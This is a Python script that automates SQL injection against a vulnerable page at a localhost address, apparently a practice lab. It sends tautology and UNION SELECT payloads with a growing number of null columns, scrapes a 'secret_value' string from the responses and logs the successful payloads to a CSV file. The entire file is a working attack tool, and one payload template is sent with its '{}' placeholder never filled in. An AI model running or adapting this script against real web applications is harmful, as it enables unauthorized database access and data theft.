import requests
import csv

# Define the target URL for the "GET parameter injection" page
target_url = 'http://localhost:8081/vulnerabilities/sqli_1'

# List of SQL injection payloads to test
payloads = [
    "'",
    "' OR '1'='1",
    # Add basic UNION injection payload template
    "' UNION SELECT {} -- ",
]

# Function to test SQL injection and check for the secret value in the response
def test_sql_injection(url, param, payload):
    # Send the request with the injected payload
    response = requests.get(url, params={param: payload})
    
    # Check if the secret value is in the response (this can be adjusted based on the actual response)
    if "secret_value" in response.text:
        print(f"Successful injection: {payload}")
        
        # Extract the secret value from the response (customize this as needed)
        # Assuming the secret value appears within some identifiable text or pattern
        secret_value = extract_secret(response.text)
        if secret_value:
            print(f"Secret Value Found: {secret_value}")
            return secret_value
    return None

# Function to extract secret value from the response text
def extract_secret(response_text):
    # Extract secret value based on a pattern in the response (modify according to actual pattern)
    # Example: looking for 'Secret: <value>' or 'secret_value: <value>'
    start_index = response_text.find('secret_value:')  # Adjust pattern to match actual response format
    if start_index != -1:
        end_index = response_text.find('<', start_index)
        if end_index == -1:
            end_index = len(response_text)  # Extract until the end if no further delimiter
        secret = response_text[start_index + len('secret_value:'):end_index].strip()
        return secret
    return None

# Function to log successful injections to a CSV file
def log_to_csv(injection_steps):
    with open('sql_injection_results.csv', mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(['Injection Step', 'SQL Injection Payload', 'Description', 'Secret Value'])
        for step in injection_steps:
            writer.writerow(step)

# Function to attempt UNION injections with varying column counts
def test_union_injection(url, param, max_columns=10):
    successful_injections = []
    
    # Try UNION injections by incrementing column count
    for columns in range(1, max_columns + 1):
        payload = "' UNION SELECT " + ', '.join(['null'] * columns) + " -- "
        print(f"Testing payload with {columns} columns: {payload}")
        
        secret_value = test_sql_injection(url, param, payload)
        
        if secret_value:
            # Log the successful injection attempt
            successful_injections.append([columns, payload, "Successfully retrieved secret value", secret_value])
            break  # Stop after the first successful injection
    
    return successful_injections

# Main function to run the SQL injection tests
def main():
    # Define the parameter to inject into (assumed to be 'id' in the URL)
    param_name = 'id'  # Modify if the vulnerable parameter name is different

    # List to store details of successful injections
    successful_injections = []

    # Try basic payloads first
    for idx, payload in enumerate(payloads, start=1):
        print(f"Testing basic payload: {payload}")
        secret_value = test_sql_injection(target_url, param_name, payload)
        
        if secret_value:
            # Log the successful injection attempt
            successful_injections.append([idx, payload, "Successfully retrieved secret value", secret_value])

    # Attempt UNION injection with varying column counts
    union_injections = test_union_injection(target_url, param_name)

    # Add UNION injection results to the list of successful injections
    successful_injections.extend(union_injections)

    # Write the successful injections to a CSV file
    log_to_csv(successful_injections)

if __name__ == "__main__":
    main()

